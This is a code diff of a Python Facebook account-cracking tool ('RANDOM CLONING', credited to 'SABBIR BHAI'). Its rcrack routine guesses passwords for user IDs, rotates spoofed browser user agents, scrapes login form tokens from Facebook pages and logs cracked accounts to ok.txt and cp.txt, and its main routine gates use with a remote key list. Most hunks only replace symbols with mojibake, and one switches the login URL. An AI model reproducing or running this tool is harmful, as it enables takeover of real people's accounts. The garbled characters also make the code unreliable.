@@ -19,18 +19,18 @@ import string
 try:
     import requests
 except ImportError:
-    print('\n [✓] installing requests !...\n')
+    print('\n [âœ“] installing requests !...\n')
     os.system('pip install requests')
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\n [✓] installing futures !...\n')
+    print('\n [âœ“] installing futures !...\n')
     os.system('pip install futures')
 try:
     import bs4
 except ImportError:
-    print('\n [✓] installing bs4 !...\n')
+    print('\n [âœ“] installing bs4 !...\n')
     os.system('pip install bs4')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
@@ -112,14 +112,14 @@ ___  ___    _   _____       _     _     _        _____
 | |\/| |/ _` |  `--. \/ _` | '_ \| '_ \| | '__|  `--. \ '__| 
 | |  | | (_| | /\__/ / (_| | |_) | |_) | | |    /\__/ / |    
 \_|  |_/\__,_| \____/ \__,_|_.__/|_.__/|_|_|    \____/|_|                                                                                                                           
-╭──────────•◈•───────────────────╮
+â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢â—ˆâ€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
 [-] TOOLS     RANDOM CLONING
 [-] VERSION    3.0.0 (V2)
 [-] AUTHOR    SABBIR BHAI
 [-] GITHUB    RDX337
 [-] TEAM      Darkbin3221
-╰──────────•◈•───────────────────╯  
-\033[93;1m Hey Guys Welcome 🥭🥭
+â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢â—ˆâ€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯  
+\033[93;1m Hey Guys Welcome ðŸ¥­ðŸ¥­
 '\33[1;97mTURN on & off (ARPLANE MODE) before use   
 \033[1;97m==============================================================="""
 
@@ -134,7 +134,7 @@ def main():
   try: 
     httpCaht = requests.get("https://github.com/Rdx337/Sabbiropi/blob/main/Ap.txt").text 
     if id in httpCaht: 
-      print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLS˜˜........\033[97m")
+      print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLSËœËœ........\033[97m")
       msg = str(os.geteuid()) 
       time.sleep(3) 
       pass 
@@ -162,7 +162,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
     else:
-        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
+        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))
         for i in range(len(game)):
             print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
@@ -218,7 +218,7 @@ def random_pak_jsjnumber():
 			pwx = [guru,bilal]
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
-	print('[✓] Crack process has been completed')
+	print('[âœ“] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
 	print(47*"-")
 	print(' Press Inter To Back Menu')
@@ -502,7 +502,7 @@ def rcrack(uid,pwx,tl):
   "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
   "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
   "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
-  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HDâ„¢ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
   "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
   "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
   "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
@@ -598,7 +598,7 @@ def rcrack(uid,pwx,tl):
 			sys.stdout.write('\r[%s] [OK:%s]'%(loop,len(oks))),
 			sys.stdout.flush()
 			pro = random.choice(agents)
-			free_fb = session.get('https://mbasic.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
